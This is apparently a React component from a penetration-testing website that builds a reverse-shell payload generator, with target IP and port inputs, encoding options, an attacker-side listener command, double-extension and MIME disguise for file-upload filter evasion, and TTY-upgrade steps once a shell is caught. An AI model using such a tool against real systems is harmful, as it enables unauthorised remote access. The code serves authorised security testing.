"use client";

import { useMemo, useState } from "react";
import { Callout } from "@/components/ui/Callout";
import { AuthorizedUseNotice } from "@/components/ui/AuthorizedUseNotice";
import { CopyButton } from "@/components/ui/CopyButton";
import { DownloadButton } from "@/components/ui/DownloadButton";
import { checkboxLabelClasses, inputClasses, selectClasses, toggleButtonClasses } from "@/components/ui/formClasses";
import { EncoderId, NONE_ENCODER, SHELL_ENCODERS, SHELL_ENCODERS_BY_ID } from "@/lib/reverse-shell/encoders";
import { buildFileBody, buildShell } from "@/lib/reverse-shell/generate";
import { OsFamily } from "@/lib/reverse-shell/params";
import { SHELL_GROUPS, SHELLS, SHELLS_BY_ID, ShellId } from "@/lib/reverse-shell/shells";
import { clampPort, defaultListener, isValidPort, validateHost } from "@/lib/reverse-shell/validation";
import { useRateLimitedGeneration } from "@/lib/hooks/useRateLimitedGeneration";

const HISTORY_KEY = "payloadify:reverse-shell-generator:history";

type OsFilter = OsFamily;
const OS_FILTERS: OsFilter[] = ["linux", "windows", "mac"];
const OS_FILTER_LABELS: Record<OsFilter, string> = {
  linux: "Linux",
  windows: "Windows",
  mac: "Mac",
};

const SAVE_EXTENSIONS = [
  "sh", "txt", "py", "php", "php5", "phtml", "ps1", "bat", "js", "pl", "rb", "lua", "go", "java", "c", "dart", "cr",
  "swift", "vbs", "html", "jpg", "jpeg", "png", "gif", "svg", "asp", "aspx", "jsp",
];
const MIME_TYPES = [
  "text/plain",
  "application/octet-stream",
  "text/x-shellscript",
  "text/x-python",
  "application/x-httpd-php",
  "application/javascript",
  "text/x-java-source",
  "text/x-csrc",
  "text/vbscript",
  "text/html",
  "image/jpeg",
  "image/png",
  "image/gif",
  "image/svg+xml",
  "application/x-msdownload",
];

const DEFAULTS = {
  ip: "10.10.10.10",
  port: 4444,
  shellPath: "/bin/bash",
  osFilter: "linux" as OsFilter,
  shellId: "bash-dev-tcp" as ShellId,
  encoded: false,
  encoderId: "none" as EncoderId,
  doubleExt: false,
  disguiseExtension: "jpg",
};

function matchesOsFilter(shellOs: OsFamily[], filter: OsFilter): boolean {
  return shellOs.includes(filter);
}

export function ReverseShellGeneratorTool() {
  const [ip, setIp] = useState(DEFAULTS.ip);
  const [portText, setPortText] = useState(String(DEFAULTS.port));
  const [shellPath, setShellPath] = useState(DEFAULTS.shellPath);
  const [osFilter, setOsFilter] = useState<OsFilter>(DEFAULTS.osFilter);
  const [shellId, setShellId] = useState<ShellId>(DEFAULTS.shellId);
  const [encoded, setEncoded] = useState(DEFAULTS.encoded);
  const [encoderId, setEncoderId] = useState<EncoderId>(DEFAULTS.encoderId);

  const [extensionOverride, setExtensionOverride] = useState<string | null>(null);
  const [mimeOverride, setMimeOverride] = useState<string | null>(null);
  const [doubleExt, setDoubleExt] = useState(DEFAULTS.doubleExt);
  const [disguiseExtension, setDisguiseExtension] = useState(DEFAULTS.disguiseExtension);

  const [generatedShellId, setGeneratedShellId] = useState<ShellId | null>(null);
  const { blockedMsg, setBlockedMsg, checkAndClear, recordGeneration } = useRateLimitedGeneration(HISTORY_KEY);

  const hostValidation = useMemo(() => validateHost(ip), [ip]);
  const port = Number(portText);
  const portValid = portText.trim().length > 0 && isValidPort(port);

  const filteredShells = useMemo(() => SHELLS.filter((s) => matchesOsFilter(s.os, osFilter)), [osFilter]);
  const visibleGroups = useMemo(
    () => SHELL_GROUPS.filter((g) => filteredShells.some((s) => s.group === g)),
    [filteredShells],
  );

  const selectedShell = SHELLS_BY_ID[shellId];
  const generatedShell = generatedShellId ? SHELLS_BY_ID[generatedShellId] : null;
  const encoder = SHELL_ENCODERS_BY_ID[encoderId] ?? NONE_ENCODER;

  const result = useMemo(() => {
    if (!generatedShell || !hostValidation.ok || !portValid) return null;
    return buildShell(generatedShell, { ip: ip.trim(), port, shellPath }, { encoded, encoder });
  }, [generatedShell, hostValidation.ok, portValid, ip, port, shellPath, encoded, encoder]);

  const listenerCommand = useMemo(() => {
    if (!generatedShell || !portValid) return null;
    const params = { ip: ip.trim(), port, shellPath };
    return generatedShell.listener ? generatedShell.listener(params) : defaultListener(port);
  }, [generatedShell, portValid, ip, port, shellPath]);

  const fileBody = useMemo(() => {
    if (!generatedShell || !hostValidation.ok || !portValid) return null;
    return buildFileBody(generatedShell, { ip: ip.trim(), port, shellPath });
  }, [generatedShell, hostValidation.ok, portValid, ip, port, shellPath]);

  const effectiveExtension = extensionOverride ?? generatedShell?.file.extension ?? "txt";
  const effectiveMime = mimeOverride ?? generatedShell?.file.defaultMime ?? "text/plain";
  const filename = doubleExt ? `reverse-shell.${effectiveExtension}.${disguiseExtension}` : `reverse-shell.${effectiveExtension}`;

  function selectOsFilter(filter: OsFilter) {
    setOsFilter(filter);
    const stillVisible = SHELLS_BY_ID[shellId] && matchesOsFilter(SHELLS_BY_ID[shellId].os, filter);
    if (!stillVisible) {
      const firstVisible = SHELLS.find((s) => matchesOsFilter(s.os, filter));
      if (firstVisible) {
        setShellId(firstVisible.id);
        if (!firstVisible.renderEncoded) setEncoded(false);
      }
    }
  }

  function selectShell(id: ShellId) {
    setShellId(id);
    const shell = SHELLS_BY_ID[id];
    if (!shell.renderEncoded) setEncoded(false);
  }

  function resetAll() {
    setIp(DEFAULTS.ip);
    setPortText(String(DEFAULTS.port));
    setShellPath(DEFAULTS.shellPath);
    setOsFilter(DEFAULTS.osFilter);
    setShellId(DEFAULTS.shellId);
    setEncoded(DEFAULTS.encoded);
    setEncoderId(DEFAULTS.encoderId);
    setExtensionOverride(null);
    setMimeOverride(null);
    setDoubleExt(DEFAULTS.doubleExt);
    setDisguiseExtension(DEFAULTS.disguiseExtension);
    setGeneratedShellId(null);
    setBlockedMsg(null);
  }

  function generate() {
    const check = checkAndClear();
    if (!check.allowed) return;
    setGeneratedShellId(shellId);
    recordGeneration(check.now);
  }

  return (
    <div className="flex flex-col gap-6">
      <AuthorizedUseNotice />

      <div className="grid gap-4 sm:grid-cols-3">
        <div>
          <label className="mb-1 block text-sm font-medium">Target IP / hostname</label>
          <input
            type="text"
            value={ip}
            onChange={(e) => setIp(e.target.value)}
            placeholder="10.10.10.10"
            className={inputClasses}
          />
          {ip.length > 0 && !hostValidation.ok && <p className="mt-1 text-xs text-red-600 dark:text-red-400">{hostValidation.message}</p>}
        </div>
        <div>
          <label className="mb-1 block text-sm font-medium">Port</label>
          <input
            type="number"
            min={1}
            max={65535}
            value={portText}
            onChange={(e) => setPortText(e.target.value)}
            onBlur={() => {
              if (portText.trim().length === 0) return;
              setPortText(String(clampPort(Number(portText))));
            }}
            className={`${selectClasses} w-full`}
          />
          {portText.length > 0 && !portValid && (
            <p className="mt-1 text-xs text-red-600 dark:text-red-400">Enter a port between 1 and 65535.</p>
          )}
        </div>
        <div>
          <label className="mb-1 block text-sm font-medium">Shell path</label>
          <input
            type="text"
            value={shellPath}
            onChange={(e) => setShellPath(e.target.value)}
            disabled={!selectedShell.usesShellPath}
            className={`${inputClasses} disabled:opacity-40`}
          />
        </div>
      </div>

      <div>
        <label className="mb-1 block text-sm font-medium">Platform</label>
        <div className="flex flex-wrap gap-1">
          {OS_FILTERS.map((f) => (
            <button key={f} type="button" onClick={() => selectOsFilter(f)} className={toggleButtonClasses(osFilter === f)}>
              {OS_FILTER_LABELS[f]}
            </button>
          ))}
        </div>
      </div>

      <div>
        <label className="mb-1 block text-sm font-medium">Shell</label>
        <select
          value={shellId}
          onChange={(e) => selectShell(e.target.value as ShellId)}
          className={`${selectClasses} w-full`}
        >
          {visibleGroups.map((group) => (
            <optgroup key={group} label={group}>
              {filteredShells
                .filter((s) => s.group === group)
                .map((s) => (
                  <option key={s.id} value={s.id}>
                    {s.label}
                  </option>
                ))}
            </optgroup>
          ))}
        </select>
        {selectedShell.note && <p className="mt-2 text-xs text-amber-600 dark:text-amber-400">{selectedShell.note}</p>}
      </div>

      <div className="grid gap-4 sm:grid-cols-2">
        <label className={checkboxLabelClasses}>
          <input
            type="checkbox"
            checked={encoded}
            disabled={!selectedShell.renderEncoded}
            onChange={(e) => setEncoded(e.target.checked)}
          />
          Encoded execution form{!selectedShell.renderEncoded && " (not available for this shell)"}
        </label>

        <div>
          <label className="mb-1 block text-sm font-medium">Transport encoding</label>
          <select value={encoderId} onChange={(e) => setEncoderId(e.target.value as EncoderId)} className={selectClasses}>
            {SHELL_ENCODERS.map((enc) => (
              <option key={enc.id} value={enc.id}>
                {enc.label}
              </option>
            ))}
          </select>
        </div>
      </div>

      <div className="flex flex-wrap gap-2">
        <button
          type="button"
          onClick={generate}
          disabled={!hostValidation.ok || !portValid}
          className="rounded bg-zinc-900 px-3 py-1.5 text-sm text-white hover:bg-zinc-700 disabled:opacity-50 dark:bg-zinc-100 dark:text-zinc-900 dark:hover:bg-zinc-300"
        >
          Generate payload
        </button>
        <button
          type="button"
          onClick={resetAll}
          className="rounded border border-zinc-300 px-3 py-1.5 text-sm text-zinc-700 hover:bg-zinc-100 dark:border-zinc-700 dark:text-zinc-300 dark:hover:bg-zinc-800"
        >
          Reset
        </button>
      </div>

      {blockedMsg && <Callout variant="danger">{blockedMsg}</Callout>}

      {!generatedShell && !blockedMsg && <Callout variant="info">Pick your options above, then click Generate payload.</Callout>}

      {generatedShell && result !== null && (
        <div className="flex flex-col gap-4">
          <div>
            <div className="mb-1 flex items-center justify-between">
              <p className="text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Payload</p>
              <CopyButton text={result} />
            </div>
            <code className="block rounded border border-zinc-200 bg-white p-3 text-sm break-all whitespace-pre-wrap dark:border-zinc-800 dark:bg-zinc-900">
              {result}
            </code>
            {encoder.usageNote && <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">{encoder.usageNote}</p>}
            <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">
              {generatedShell.os.join(" / ")} · {generatedShell.group} · {generatedShell.label}
              {encoder.id !== "none" && <> · {encoder.label}</>}
            </p>
          </div>

          {listenerCommand && (
            <div>
              <div className="mb-1 flex items-center justify-between">
                <p className="text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Listener (attacker side)</p>
                <CopyButton text={listenerCommand} />
              </div>
              <code className="block rounded border border-zinc-200 bg-white p-3 text-sm break-all whitespace-pre-wrap dark:border-zinc-800 dark:bg-zinc-900">
                {listenerCommand}
              </code>
            </div>
          )}

          {fileBody && (
            <div>
              <p className="mb-1 text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Save as file</p>
              <div className="flex flex-wrap items-center gap-2">
                <select value={effectiveExtension} onChange={(e) => setExtensionOverride(e.target.value)} className={selectClasses}>
                  {SAVE_EXTENSIONS.map((ext) => (
                    <option key={ext} value={ext}>
                      .{ext}
                    </option>
                  ))}
                </select>
                <select value={effectiveMime} onChange={(e) => setMimeOverride(e.target.value)} className={selectClasses}>
                  {MIME_TYPES.map((m) => (
                    <option key={m} value={m}>
                      {m}
                    </option>
                  ))}
                </select>
                <label className={checkboxLabelClasses}>
                  <input type="checkbox" checked={doubleExt} onChange={(e) => setDoubleExt(e.target.checked)} />
                  Double extension
                </label>
                {doubleExt && (
                  <select value={disguiseExtension} onChange={(e) => setDisguiseExtension(e.target.value)} className={selectClasses}>
                    {SAVE_EXTENSIONS.map((ext) => (
                      <option key={ext} value={ext}>
                        .{ext}
                      </option>
                    ))}
                  </select>
                )}
                <DownloadButton content={fileBody} filename={filename} mimeType={effectiveMime} />
              </div>
              <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">
                Will save as <code>{filename}</code>. The extension and MIME type are independent of each other and of the file&apos;s actual
                content — useful for testing upload filters, but not a guarantee against magic-byte/content inspection.
              </p>
            </div>
          )}

          <details className="rounded border border-zinc-200 dark:border-zinc-800">
            <summary className="cursor-pointer px-3 py-2 text-sm font-medium">After you catch the shell</summary>
            <div className="flex flex-col gap-2 px-3 pb-3 text-sm text-zinc-600 dark:text-zinc-400">
              <p>Upgrade a bare Unix shell to a full interactive TTY:</p>
              <div className="flex items-center justify-between gap-2">
                <code className="block flex-1 rounded border border-zinc-200 bg-white p-2 text-xs break-all dark:border-zinc-800 dark:bg-zinc-900">
                  python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;
                </code>
                <CopyButton text={'python3 -c \'import pty; pty.spawn("/bin/bash")\''} />
              </div>
              <p>
                Then background it (<code>Ctrl+Z</code>), run <code>stty raw -echo; fg</code>, press Enter twice, and set{" "}
                <code>export TERM=xterm</code> for working arrow keys/Ctrl+C and a correct terminal size.
              </p>
            </div>
          </details>
        </div>
      )}
    </div>
  );
}
